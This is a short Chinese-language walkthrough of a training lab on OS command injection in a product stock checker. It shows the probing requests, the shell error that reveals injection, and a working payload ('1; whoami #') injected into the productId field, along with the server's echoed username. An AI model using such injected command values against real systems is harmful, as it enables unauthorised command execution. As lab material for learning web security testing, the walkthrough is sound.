# 实验：操作系统命令注入，简单案例

本实验在产品库存检查器中包含一个操作系统命令注入漏洞。

应用程序执行一个包含用户提供的产品和商店 ID 的 shell 命令，并在其响应中返回该命令的原始输出。

为了解决本实验，请执行 `whoami` 命令以确定当前用户的名称。

## 步骤

探测
- 使用库存检索功能
    ```http
    POST /product/stock HTTP/2

    productId=1&storeId=1
    ```

测试字段 OS 注入
- productId 字段测试分隔符
    ```log
    productId=<@urlencode>1;</@urlencode>&storeId=<@urlencode>1</@urlencode>
    ```
    - 服务器响应
        ```log
        /home/peter-igQvxR/stockreport.sh: line 5: $2: unbound variable
        sh: 1: 1: not found
        ```
        - 此处作为 shell 命令执行，分隔后的参数 storeId 的值1被作为新语句

- 尝试在 productId 字段注入命令
    ```log
    productId=<@urlencode>1; whoami #</@urlencode>&storeId=<@urlencode>1</@urlencode>
    ```
    - 得到命令回显 
        `peter-igQvxR`
